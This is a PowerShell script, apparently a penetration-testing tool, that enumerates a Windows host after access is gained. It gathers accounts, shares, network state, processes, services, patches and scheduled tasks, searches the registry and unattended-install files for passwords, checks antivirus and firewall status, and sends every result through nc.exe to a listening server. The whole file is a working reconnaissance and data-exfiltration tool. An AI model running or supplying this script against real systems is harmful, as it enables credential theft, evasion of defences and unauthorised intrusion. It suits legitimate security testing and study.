
#requires -version 2

<#
Author: Hacker101 (@raj77in)
License: BSD 3-Clause
Required Dependencies: None
Start ncat with ncat -lnkp 8001 >server.log
#>


function Set-Output {
    [CmdletBinding()]
    Param(
        [string]$Command ,
        [string]$Outfile = '.\output.log',
        [string]$Dip,
        [int]$Dport,
        [switch]$screen,
        [Parameter(ValueFromPipeline = $true)] [String[]]$Fullout
    )
    
    $fulltext = @()
    $fulltext += "=============== $command ==============="
    foreach ($value in $input) { $fulltext += $value }
    Write-Host "Collecting $Command"

    $fulltext | Out-File -FilePath $Outfile -Append -NoClobber
    # Write-Host $fulltext
    $fulltext | nc.exe -w1  127.0.0.1 8001
    
    # $fulltext | nc.exe -w1  127.0.0.1 8001
}

# General enumeration
whoami | Set-Output -Command whoami
hostname | Set-Output -Command hostname
systeminfo | Set-Output  -Command systeminfo
cmd /c 'echo %path%' | Set-Output  -Command path

## User Details
net users | Set-Output -Command users
net share | Set-Output -Command share

Get-LocalUser | select * | Set-Output -Command "net user"

## Network
ipconfig /all | Set-Output -Command ipconfig
netstat -ano  | Set-Output -Command netstat
arp -a  | Set-Output -Command arp
netstat -r | Set-Output -Command 'netstat routing'

## Process
tasklist /svc | Set-Output -Command tasklist


## Password Search

#cmd /c 'cd c:\;dir /s *password*'  | Set-Output -Command  'dir password'
#cmd /c 'cd c:\;dir /s *pass* == *cred* == *vnc* == *.config*'  | Set-Output -Command 'dir pass|cred|vnc|config'
# findstr /si password *.ini *.xml *.txt | Set-Output -Command 'dir password in ini|xml|txt'
# findstr /spin "password" *.*  | Set-Output -Command 'findstr password'
reg query HKLM /f password /t REG_SZ /s  | Set-Output -Command 'reg query password HKLM'
reg query HKCU /f password /t REG_SZ /s  | Set-Output -Command 'reg query password HKCU'

## Interesting Files

type c:\sysprep.inf | Set-Output -Command 'sysprep.inf'
type c:\sysprepsysprep.xml | Set-Output -Command 'sysprepsysprep.xml'
type %WINDIR%\Panther\Unattend\Unattended.xml | Set-Output -Command 'unattended.xml'
type %WINDIR%\Panther\Unattended.xml | Set-Output -Command 'unattended.xml'

## wmic Enumeration

wmic share list | Set-Output -Command 'wmic share list'
wmic useraccount list | Set-Output -Command 'wmic useraccount list'
wmic startup list brief | Set-Output -Command 'wmic startup list'
wmic process list brief  | Set-Output -Command 'wmic process list'
wmic environment list  | Set-Output -Command 'wmic env list'
wmic startup list full | Set-Output -Command 'wmic startup list full'
wmic group list brief | Set-Output -Command 'wmic group list'
wmic qfe get Caption,Description,HotFixID,InstalledOn | Set-Output -Command 'wmic hotfix list'

## AV and Firewall

wmic /namespace:\\root\securitycenter2 path antivirusproduct  | Set-Output -Command 'AV product'
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Set-Output -Command 'CMI AV Product'
Get-Service WinDefend  | Set-Output -Command 'Windows defender'
Get-MpComputerStatus | select RealTimeProtectionEnabled  | Set-Output -Command 'Real time protection'


Get-NetFirewallProfile | Format-Table Name, Enabled  | Set-Output -Command 'FW Profile'
Get-NetFirewallRule | select DisplayName, Enabled, Description  | Set-Output -Command 'FW Rules enabled'
Get-MpThreat  | Set-Output -Command 'MpThreat'

## Service details
wmic service get Name,Path  | Set-Output -Command 'Service name and path'
net start | Set-Output -Command 'net start'

## Scheduled Tasks
schtasks /query /fo LIST /v | Set-Output -Command 'Scheduled Tasks'


## Kernel driver details
driverquery | Set-Output -Command 'DriverQuery'

